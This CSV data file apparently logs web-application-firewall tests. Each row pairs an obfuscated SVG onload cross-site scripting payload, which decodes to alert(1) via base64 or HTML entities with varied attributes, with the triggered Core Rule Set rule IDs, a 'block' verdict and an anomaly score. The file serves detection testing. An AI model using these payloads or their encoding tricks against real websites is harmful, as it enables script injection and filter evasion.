index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
19,<svg onload=Function(atob('YWxlcnQoMSk='))()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628753158.536280
2019,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#0040;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628933413.107546
2020,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#0040;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628933588.134506
2021,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#0040;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628933681.590001
2028,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" class=x></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628934364.057294
2029,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' class=x></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628934418.349382
2034,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" xmlns=""http://www.w3.org/2000/svg""></svg></svg>",0,1,block,5,"941100,941120,941130,941160,949110","v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,6v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628934937.279794
2035,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' xmlns=""http://www.w3.org/2000/svg""></svg></svg>",0,1,block,5,"941100,941120,941130,941160,949110","v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,6v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628935045.605023
2036,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() xmlns=""http://www.w3.org/2000/svg""></svg></svg>",0,1,block,5,"941100,941120,941130,941160,949110","v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o39,6v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628935177.072355
2040,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" width=100></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628935598.685839
2041,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' width=100></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628935657.173644
2042,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() width=100></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628935792.892352
2045,<svg><svg width=100 onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,27v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628936077.342561
2046,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" height=100></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628936125.078636
2047,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' height=100></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628936296.460294
2048,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() height=100></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628936377.774821
2058,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" style=""color:red""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,48v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762893737.882618
2059,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' style=""color:red""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,48v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628937484.850616
2064,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" viewBox=""0 0 100 100""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628937969.006014
2065,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' viewBox=""0 0 100 100""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628938051.658099
2066,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() viewBox=""0 0 100 100""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628938141.798831
2070,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" fill=""red""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762893851.803812
2071,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' fill=""red""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628938657.165212
2072,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() fill=""red""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628938769.710963
2076,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" stroke=""blue""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628939198.238719
2077,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' stroke=""blue""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628939298.023975
2078,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() stroke=""blue""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628939388.086335
2088,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" y=0></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628940481.860706
2089,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' y=0></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628940441.888874
2094,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" opacity=0.5></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628941040.864597
2095,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' opacity=0.5></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628941095.603954
2096,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() opacity=0.5></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628941173.484509
2100,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" transform=""rotate(45)""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628941541.700643
2101,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' transform=""rotate(45)""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628941767.967777
2106,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" version=""1.1""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628942120.441132
2107,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' version=""1.1""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628942243.291074
2108,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() version=""1.1""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628942382.902170
2112,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" preserveAspectRatio=""none""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628942734.750516
2113,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' preserveAspectRatio=""none""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762894283.936207
2118,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" clip-path=""circle()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628943398.069892
2119,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' clip-path=""circle()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762894345.146469
2120,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() clip-path=""circle()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628943535.800609
2124,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762894397.111362
2125,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944014.350801
2126,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944113.804802
